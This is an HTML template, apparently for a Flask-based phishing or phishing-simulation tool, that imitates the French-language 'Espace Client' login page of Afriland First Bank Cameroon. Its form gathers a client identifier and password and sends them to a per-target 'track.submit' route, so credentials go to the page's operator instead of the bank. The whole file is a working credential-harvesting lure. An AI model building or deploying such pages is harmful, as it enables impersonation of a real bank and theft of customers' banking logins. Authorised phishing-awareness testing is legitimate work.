<!doctype html>
<html lang="fr"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Espace Client - Afriland First Bank</title>
<style>
  body { margin:0; font-family: Georgia, serif; background:#f4f4f4; }
  .header { background:#0F5132; color:#fff; padding:20px; text-align:center; font-weight:bold; font-size:1.3rem;}
  .box { max-width:420px; margin:40px auto; background:#fff; padding:32px; border-top:4px solid #DAA520; box-shadow:0 2px 12px rgba(0,0,0,.1);}
  h2 { color:#0F5132; margin-top:0;}
  input { width:100%; padding:11px; margin:8px 0; box-sizing:border-box; border:1px solid #ccc; border-radius:2px; font-family:Arial;}
  button { width:100%; padding:12px; background:#0F5132; color:#fff; border:0; border-radius:2px; font-weight:bold; font-size:1rem; cursor:pointer;}
  .footer { margin-top:16px; font-size:.7rem; color:#555; text-align:center; font-family:Arial;}
</style></head><body>
<div class="header">AFRILAND FIRST BANK</div>
<div class="box">
  <h2>Espace Client</h2>
  <p style="color:#333; font-family:Arial; font-size:.95rem;">Acces securise a vos services bancaires.</p>
  <form method="post" action="{{ url_for('track.submit', token=token) }}">
    <input type="text" name="identifier" placeholder="Identifiant client" required>
    <input type="password" name="secret" placeholder="Mot de passe" required>
    <button type="submit">SE CONNECTER</button>
  </form>
  <div class="footer">© Afriland First Bank Cameroun — BP 11834 Yaoundé</div>
</div>
